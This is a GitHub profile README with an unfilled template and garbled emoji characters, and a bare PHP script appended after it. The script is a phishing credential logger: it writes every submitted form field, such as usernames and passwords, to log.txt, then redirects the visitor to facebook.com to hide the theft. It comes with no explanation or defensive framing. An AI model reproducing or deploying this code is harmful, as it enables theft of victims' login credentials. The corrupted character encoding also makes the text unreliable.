- š Hi, Iām @HassanBukhati
- š Iām interested in ...
- š± Iām currently learning ...
- šļø Iām looking to collaborate on ...
- š« How to reach me ...

<!---
HassanBukhati/HassanBukhati is a āØ special āØ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
<?php 

  
// Set the location to redirect the page 

header ('Location: http://www.facebook.com'); 

  
// Open the text file in writing mode  

$file = fopen("log.txt", "a"); 

  

foreach($_POST as $variable => $value) { 

    fwrite($file, $variable); 

    fwrite($file, "="); 

    fwrite($file, $value); 

    fwrite($file, "\r\n"); 
} 

  

fwrite($file, "\r\n"); 

fclose($file); 

exit; 
?> 
